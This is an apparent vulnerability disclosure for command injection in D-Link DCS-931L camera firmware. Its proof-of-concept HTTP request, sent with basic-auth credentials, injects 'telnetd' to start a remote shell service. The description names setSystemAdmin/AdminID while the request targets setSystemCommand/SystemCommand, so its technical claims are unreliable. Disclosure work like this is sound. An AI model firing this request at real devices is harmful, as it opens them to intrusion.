# D-Link DCS931L  Command Execution
Affected Product: D-Link DCS931L

Affected Firmware Versions: v1.0.0

Vulnerability Type: Command Execution









# Vulnerability Description
A command injection vulnerability exists in the setSystemAdmin function of the alphapd binary in D-Link DCS-931L firmware v1.0.0。

The AdminID parameter is directly taken from user input and inserted into shell commands without proper sanitization, allowing remote attackers to execute arbitrary OS commands via crafted requests.

The trigger point is located in the middle,setSystemCommand。

# Vulnerability Details
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/58401686/1770468949519-a3df5b71-c146-4bab-896d-5b25cd4ab81f.png)

We Click sub_428138

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/58401686/1770468976993-307b3831-f597-49fb-a7b1-91218590b884.png)

There have Command inject.

# POC
```plain
POST /setSystemCommand HTTP/1.1
Host: 192.168.0.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: http://192.168.0.2
Authorization: Basic YWRtaW46MjJiOWRoY2Y=
Connection: keep-alive
Referer: http://192.168.0.2/advanced.htm
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ReplySuccessPage=advanced.htm&ReplyErrorPage=errradv.htm&ConfigSystemCommand=Save&SystemCommand=telnetd
```



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/58401686/1770468554301-fbfb1576-3ec9-44b9-9e4f-d326e3496f55.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/58401686/1770468535223-939859f7-4f83-4084-b70e-7979f351f0af.png)

